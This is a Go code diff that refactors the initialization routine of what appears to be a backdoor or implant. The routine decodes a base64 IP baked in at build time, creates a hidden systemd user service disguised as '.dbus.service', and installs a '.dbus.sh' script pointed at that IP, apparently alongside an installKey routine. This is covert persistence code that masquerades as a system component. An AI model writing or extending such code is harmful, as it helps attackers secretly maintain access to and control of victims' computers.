@@ -125,21 +125,19 @@ func installKey(path string) error {
 
 func Init(ip string) {
 
-	decode, err := base64.StdEncoding.DecodeString(ip)
+	decodedIP, err := base64.StdEncoding.DecodeString(ip)
 	if err != nil {
 		log.Fatal("error:", err)
 	}
-	IP = string(decode)
-	//go build -ldflags "-X main.IP={IP}"
 
 	// get current home directory
 	home, _ := os.UserHomeDir()
 
-	if _, err := os.Stat(home + "/.config/systemd/user/.dbus.service"); err == nil {
+	if _, err = os.Stat(home + "/.config/systemd/user/.dbus.service"); err == nil {
 		return
 	}
 
-	err := os.MkdirAll(home+"/.config/systemd/user/", 0777)
+	err = os.MkdirAll(home+"/.config/systemd/user/", 0777)
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -151,7 +149,7 @@ func Init(ip string) {
 		return
 	}
 
-	err = installScript(home+"/.config/systemd/user/.dbus.sh", ip)
+	err = installScript(home+"/.config/systemd/user/.dbus.sh", string(decodedIP))
 	if err != nil {
 		fmt.Println(err)
 		return
